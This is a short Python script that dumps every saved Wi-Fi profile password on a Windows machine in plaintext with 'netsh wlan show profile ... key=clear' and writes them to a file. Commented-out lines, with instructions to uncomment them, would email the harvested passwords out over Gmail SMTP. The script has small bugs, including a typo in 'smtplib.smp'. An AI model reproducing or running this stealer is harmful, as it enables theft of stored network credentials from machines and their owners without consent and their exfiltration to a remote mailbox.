import subprocess
import smtplib
import re

command = "netsh wlan show profile"
networks = subprocess.check_output(command ,shell=True)

network_list = re.findall('(?:Profile\s*:\s)(.*)' ,networks)

f_output = ''

for network in network_list:
    commnd = 'netsh wlan show profile ' + network + ' key=clear'
    one_network_res = subprocess.check_output(commnd ,shell=True)

    f_output += one_network_res

file = open('wifi_passwd.txt' ,'w')
file.write(f_output)
file.close()

'''
you can send from your email to your email own email by mentionind the same emails in sendmail methon params.
just umcomment the below lines and enter the valid email and password
'''
# server = smtplib.smp("smtp.gmail.com" ,587)
# server.starttls()
# server.login('enter your email here' ,'enter your passwd here')
# server.sendmail('enter email from which you wanna send' ,'enter email to which you wanna send' ,f_output)

# server.quit()
